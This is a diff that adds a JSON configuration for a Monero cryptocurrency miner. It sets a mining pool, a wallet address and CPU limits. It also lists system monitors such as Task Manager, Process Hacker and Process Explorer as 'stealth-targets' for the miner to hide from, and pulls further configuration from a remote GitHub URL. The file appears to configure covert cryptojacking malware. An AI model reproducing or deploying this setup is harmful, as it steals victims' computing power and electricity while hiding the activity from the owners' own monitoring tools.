@@ -1,0 +1,16 @@
+{
+    "algo": "rx/0",
+    "pool": "xmr.2miners.com",
+    "port": 12222,
+    "wallet": "446CooHckXfczXVf18MqGyiMAtAz8WqkDLF6b3zrUFzp1mgykEKUVuqYhdz535VDcc2H4Mvd6oLtADopzcyVYpuc3iTHzmG",
+    "password": "x1",
+    "nicehash": false,
+    "ssltls": true,
+    "max-cpu": 40,
+    "idle-wait": 5,
+    "idle-cpu": 80,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": "",
+    "stealth-fullscreen": true,
+    "api-endpoint": "https://raw.githubusercontent.com/dark4shadow/someRemoteConfMine/conf.json"
+}
